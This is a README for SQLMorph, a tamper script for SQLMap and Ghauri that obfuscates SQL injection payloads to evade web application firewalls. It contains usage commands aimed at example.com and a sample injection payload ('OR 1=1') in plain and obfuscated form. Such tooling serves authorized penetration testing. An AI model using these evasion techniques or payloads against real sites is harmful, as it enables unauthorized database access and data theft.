# SQLMorph  ~ Tamper Script for SQLMap & Ghauri

This is a custom **tamper script** for **SQLMap** and **Ghauri**, designed to **obfuscate SQL injection payloads** and help bypass Web Application Firewalls (WAFs). It modifies SQL queries by applying **random case changes, URL encoding, logical operator substitution**, and other techniques.

## Features
✅ Randomizes case of SQL keywords to evade detection
✅ Replaces `OR` with `||` and `AND` with `&&`
✅ Injects random spaces and comments (`/**/`) to break up keywords
✅ URL encodes parts of the payload for further obfuscation
✅ Can be combined with other tamper scripts for enhanced effectiveness

## Installation

Clone the repository:
```bash
git clone https://github.com/manojxshrestha/SQLMorph.git
cd SQLMorph
```

## Usage

### With SQLMap
Use the tamper script alongside other tampers:+
```bash
sqlmap -u "https://example.com/?id=2" --tamper=sqlmorph.py,space2comment
```

Example using multiple tamper scripts:
```bash
sqlmap -u "https://example.com/?id=2" --tamper=sqlmorph.py,space2comment,randomcase,charencode
```

### With Ghauri
Use the tamper script with Ghauri for blind SQL injection:
```bash
ghauri -u "https://example.com/?id=2" --fetch-using=hsqlmorph.py/space2comment
```

### Example Input & Output
#### **Original Payload:**
```sql
SELECT * FROM users WHERE username = 'admin' OR 1=1 --
```
#### **Tampered Output:**
```sql
sElEcT/**/*/**/FrOm/**/users/**/wHeRe/**/username/**/=/**/'admin'/**/||/**/1=1--
```

## Combining with Other Tamper Scripts
To further obfuscate SQLi payloads, you can combine multiple tamper scripts:
```bash
sqlmap -u "https://example.com/?id=2" --tamper=sqlmorph.py,space2comment,randomcase
```

## Disclaimer
🚨 **For ethical use only!** 🚨 This script is intended for **security testing and research purposes**. Unauthorized use on systems you do not own or have permission to test is illegal and may result in serious consequences.

